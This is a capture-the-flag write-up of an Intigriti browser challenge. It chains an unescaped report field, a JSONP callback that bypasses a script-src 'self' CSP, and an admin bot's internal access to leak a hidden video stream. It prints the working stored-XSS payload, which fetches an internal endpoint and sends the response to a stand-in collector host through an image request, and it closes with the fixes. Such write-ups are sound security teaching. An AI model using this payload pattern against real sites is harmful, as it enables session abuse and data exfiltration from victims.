---
title: Intigriti Challenge 0826 write-up - Please (Don't) Stand By
---

# Intigriti Challenge 0826 write-up - Please (Don't) Stand By

**Author:** zzzquil  
**Challenge:** Intigriti Challenge 0826 - Please (Don't) Stand By  
**Category:** XSS / CSP bypass  
**Difficulty:** Medium/High  
**Status:** ✅ Solved  

*An XSS chain through a broken TV.*

---

Old TVs had a habit of showing a "Please Stand By" card when the signal dropped.
This month's Intigriti challenge is exactly that: a retro TV set in the browser,
stuck on static, with a single instruction: *make the TV work to capture the flag*. The whole puzzle hides behind one small button: **report bad reception**.

<div align="center">
<img width="500" alt="tv" src="https://gist.github.com/user-attachments/assets/c4c09cbd-81dd-48e9-85a8-521d5abb4f6c" />
</div>

> _the challenge page - the TV showing static, keypad, report button_

---

## What the TV actually does

The page ships all its logic inline, so a quick read tells you everything.

The tuner asks the server for a channel and drops whatever comes back into the
`<video>` element:

```js
const VALID = /^[A-Za-z0-9._-]+\.mp4$/;
async function tune(n) {
  osd.textContent = 'CH ' + pad(n);
  const res = await fetch(`/api/channels/${n}/load`);
  const url = (await res.text()).trim();
  if (VALID.test(url)) setTube(url);
}
```

Every channel from 1 to 10 returns the same thing: `static.mp4`. Anything above
10 returns `403 channel not available`. So no matter what you press, the TV
plays static. That's the "bad reception."

The report button takes whatever is on the on-screen display and sends it off:

```js
const channelId = osd.textContent.replace('CH', '').trim();
fetch('/api/report', { method:'POST', body: new URLSearchParams({channelId}) });
```

Reporting hands the channel to an **admin bot** that opens an internal review
page. Point the report at your own server and you can watch it happen:
`HeadlessChrome`, coming from an internal origin, `Referer: http://web/`.

<div align="center">
  <img width="1258" height="328" alt="hit_moderate" src="https://gist.github.com/user-attachments/assets/30e28108-61aa-4ff3-b260-e430c174e2f3" />
</div>

> _the injected <img> fires from the bot - HeadlessChrome, referer http://web/_

That's the shape of the challenge: whatever I put in `channelId` ends up on a
page a privileged bot will open. Now I need to get code running there.

---

## Bug 1 - the report is reflected into the bot's page

The bot opens `/moderate/<id>`. From outside it's a hard 403 (blocked at the
edge), but by injecting a passive element and watching my server, I could read
the page back. My `channelId` lands in it completely unescaped:

```html
<blockquote class="reported">https://.../challenge#<CHANNELID_HERE></blockquote>
```

So I control HTML inside the page the admin reviews. Half a stored XSS, except for the lock on the door.

---

## Bug 2 - the CSP and the key left next to it

The moderation page sets:

```
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'none'
```

Inline scripts and external scripts are dead. `<img>` and `<link>` load fine,
but a `<script>` only runs if it comes from the site itself.

The site itself, though, hands out a blank cheque. There's a JSONP endpoint:

```
GET /api/jsonp?callback=PWN  →  /**/ PWN({"channels": 10});
```

The `callback` value is reflected straight into an `application/javascript`
response with no validation at all. Because it's same-origin, `script-src 'self'`
happily allows it. This is the textbook JSONP CSP bypass. The guard checks *where* the script
comes from, not *what's in it*:

```
1<script src="/api/jsonp?callback=MY_JS_HERE"></script>
```

Now `MY_JS_HERE` runs in the admin bot's browser, on the internal origin.

---

## Why this is XSS and not CSRF

Worth a pause here, because the setup *feels* like CSRF and it isn't.

CSRF is when you make a victim perform an action they're allowed to perform,
riding their session, without any code of yours running, a form auto-submitted from a page you host. Nothing executes; a legitimate request just fires behind
the victim's back.

Here, my JavaScript actually runs in the bot's context. It fetches, reads
responses, exfiltrates. That's arbitrary code execution in someone else's session. That's XSS. And because the payload is stored in the report
and served back when the bot opens it, it's specifically **stored** XSS, not
reflected.

The reason the result later smells like SSRF, making the bot reach internal
resources, is a separate thing: SSRF and CSRF sound alike but point opposite
ways. CSRF drives the victim's browser at the *server*; SSRF drives the *server*
at internal targets. What I have is XSS that I then use to defeat a
perimeter-only access control.

---

## Bug 3 - the channel that only exists on the inside

With JS running as the bot, the obvious moves, reading its cookie or dumping the moderation DOM, led
nowhere. No flag in either. I was stuck for a while.

Then the first official hint reframed the whole thing:

> _"If you happen to fix the bad reception, will you still be limited to only 10 channels?"_

Ten channels is the *external* limit. From outside, `/api/channels/11/load`
returns 403. But I wasn't outside anymore. The bot was. So I made the bot ask:

```js
fetch('/api/channels/11/load')
  .then(r => r.text())
  .then(t => new Image().src = 'https://COLLAB/?x=' + encodeURIComponent(t))
```

`new Image().src` is just the return channel: creating an image with that URL
fires a request to my server even though no image exists, and `t`, the response body, rides along in the query string. The whole thing goes in as `channelId`:

```
1<script src=/api/jsonp?callback=fetch('/api/channels/11/load').then(r=>r.text()).then(t=>new Image().src='https://COLLAB/?x='+encodeURIComponent(t))//></script>
```

Delivered through the JSONP tag, the bot fetched channel 11 from the internal origin, and instead of 403 it
came back:

```
3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
```

A real stream, not static. Channel 11 was live the whole time; the restriction
only ever existed at the edge.

<img width="1265" height="420" alt="hidden_stream" src="https://gist.github.com/user-attachments/assets/b5467bc1-dbb2-46a3-a07c-ac50f2c033e1" />

> _collaborator hit with the channel-11 filename_

---

## The flag was on TV

The stream is served at `/static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4`, and once you know the name
it's public. I downloaded it and played it. It's the TV, finally receiving a
signal:

<img width="500" alt="flag" src="https://gist.github.com/user-attachments/assets/0cf044df-fb7b-442a-b297-72a426f4ac21" />

> _the channel-11 video with the flag on screen_

The "bad reception" was the point all along. Fix it, reach the channel the outside world can't, and the picture comes in.

---

## The chain in one line

Unescaped `channelId` → HTML injection in the admin's console → JSONP callback
reflection defeats `script-src 'self'` → JS runs as the bot on the internal
origin → the bot reads channel 11, gated only at the edge → the stream shows the
flag.

## What each fix would have broken

Output-encode `channelId` and the injection dies at step one. Validate the JSONP
callback (or drop it for CORS + JSON) and the CSP holds. Enforce channel access
in the app instead of only at the edge and channel 11 stays unreachable even for
the bot. Any single one of these stops the whole thing, which is the real lesson: defense in depth isn't a slogan, every link in a chain is also a place
to break it.

> Thanks to Intigriti for the challenge.

![cable_guy](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExOWkzYmhraXVjaXM3eDllaXFmMDVrOWttcDRpcjA4aDJtZXcwcXViZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/7buOk27siYfWU/giphy.gif)

---

*Write-up by zzzquil for Intigriti Challenge 0826 - August 2026*
